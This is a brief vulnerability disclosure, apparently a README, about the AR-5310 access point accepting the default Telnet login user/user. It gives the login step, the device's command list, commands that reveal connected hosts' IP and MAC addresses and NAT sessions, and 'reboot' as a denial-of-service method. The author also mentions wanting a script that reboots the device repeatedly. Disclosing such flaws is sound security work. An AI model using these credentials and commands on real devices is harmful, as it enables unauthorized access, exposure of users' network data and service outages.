Telnet default credentials can lead to information disclosure and denial-of-service (DoS) attacks.



## Steps To reporduce

This affect the AP AR-5310
```bash
  Telnet 192.168.1.1
  username:user
  password:user
  Then Boom ... You logged in 
```


## Information disclosure through Telnet default credentials
```bash
    When you log in using Telnet service, 
    type the command 'help' or '?' to view    
    available options:
    
    > reboot, ping, lanhosts, passwd
  
    > restoredefault, nslookup, traceroute
  
    > save, uptime, exitOnIdle, wan, version,
  
    > serialnumber, modelname, tr69cfg, nat

```
```bash
  To obtain the IP and MAC address of each device 
  connected to the network, run the command  
  'lanhosts'.
  To display all NAT sessions through the Access  
  Point (AP), 
  use the command 'nat show session'
```
## Dos attack 
```bash
  To execute a Denial of Service (DoS) attack, 
  run the command 'reboot' to restart the AP. 
  I want to automate a script that will 
  consistently restart the AP.

```
